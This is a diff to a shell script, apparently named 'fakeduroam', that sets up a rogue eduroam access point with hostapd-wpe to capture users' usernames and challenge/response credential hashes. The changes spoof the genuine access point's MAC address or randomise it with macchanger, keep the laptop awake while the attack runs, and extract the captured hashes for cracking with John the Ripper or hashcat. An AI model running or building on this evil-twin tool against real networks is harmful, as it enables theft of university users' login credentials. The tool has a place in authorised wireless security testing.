@@ -18,13 +18,22 @@ ssid='eduroam'
 interface='wlp3s0'
 # Where to save the caught username/challenge/response
 log_dir='/home/siren/fakeduroam'
-# Will be set if we fail to get the MAC address of the real AP
-mac='DE:AD:BA:BE:13:37'
 
 if [ `id -u` != "0" ]; then
 	echo "This script requires root privileges, try again with doas."
 	exit 1
 fi
+
+restore() {
+	ip link set "$interface" down
+	macchanger -r "$interface"
+	ip link set "$interface" up
+
+	# Restore suspend on lid close
+	sed -i '/zzz/ s/#//' /etc/acpi/handler.sh
+}
+
+trap restore INT
 
 case "$1" in
 	init)
@@ -48,15 +57,19 @@ case "$1" in
 		# Modify hostapd-wpe.conf
 		sed -i -e "/ssid=/s/=.*/=$ssid/" /etc/hostapd-wpe/hostapd-wpe.conf
 		sed -i -e "/interface=/s/=.*/=$interface/" /etc/hostapd-wpe/hostapd-wpe.conf
+		echo 'Done!'
 		;;
 	run)
+		# Disable suspend on lid close event
+		 sed -i '/zzz/ s/./#&/' /etc/acpi/handler.sh
+
 		# Set MAC address of the original AP
 		orig_mac=`iwlist "$interface" scan | grep -B 5 "$ssid" | head -n 1 | sed -e 's/.*Address: //'`
 		ip link set "$interface" down
 		if [ "$orig_mac" ]; then
 			ip link set "$interface" address "$orig_mac"
 		else
-			ip link set "$interface" address "$mac"
+			macchanger -r "$interface"
 		fi
 		ip link set "$interface" up
 
@@ -68,7 +81,7 @@ case "$1" in
 	parse)
 		# Remove duplicates and extract hashes
 		# $2 must be 'jtr' or 'hashcat'
-		grep "$2" hostapd-wpe.log | sed 's/.*\s//' | awk -F: '!a[$1]++' > hashes.txt
+		grep "$2" $log_dir/hostapd-wpe.log | sed 's/.*\s//' | awk -F: '!a[$1]++' > $log_dir/hashes.txt
 		;;
 	*)
 		echo "Option doesn't exist. Read the script."
